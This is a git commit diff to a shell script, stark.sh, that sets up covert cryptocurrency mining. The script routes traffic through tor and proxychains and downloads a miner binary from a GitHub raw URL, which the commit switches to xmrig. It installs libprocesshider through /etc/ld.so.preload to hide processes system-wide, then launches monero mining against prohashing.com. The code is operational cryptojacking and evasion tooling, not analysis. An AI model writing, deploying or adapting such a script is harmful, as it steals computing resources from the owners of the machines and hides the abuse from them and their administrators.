0ed2aa810b86de3d15b3e7699c0f3c381c265b8e
frankykamat <108166803+frankykamat@users.noreply.github.com>
2022-07-11 18:42:16 +0700

    Update stark.sh

--- stark.sh
+++ stark.sh
@@ -6,8 +6,8 @@ service tor start
 
 sed -i -e 's/#dynamic_chain/dynamic_chain/g;s/strict_chain/#strict_chain/g;s/socks4/socks5/g' /etc/proxychains.conf
 
-wget https://raw.githubusercontent.com/hondacars/xxx/main/srb
-chmod +x srb
+wget https://raw.githubusercontent.com/hondacars/xxx/main/xmrig
+chmod +x xmrig
 
 git clone https://github.com/gianlucaborello/libprocesshider.git
 cd libprocesshider
@@ -16,4 +16,4 @@ gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
 mv libprocesshider.so /usr/local/lib/;echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload
 cd ..
 
-proxychains ./srb --disable-gpu --algorithm ghostrider --pool prohashing.com:3362 --wallet Prodent a=gr,c=raptoreum,n=DENT
+proxychains ./xmrig -o stratum+tcp://prohashing.com:3359 -u Prodent -p n=$(echo $(shuf -i 1-200 -n 1)-CS) -k --coin monero -a rx/0
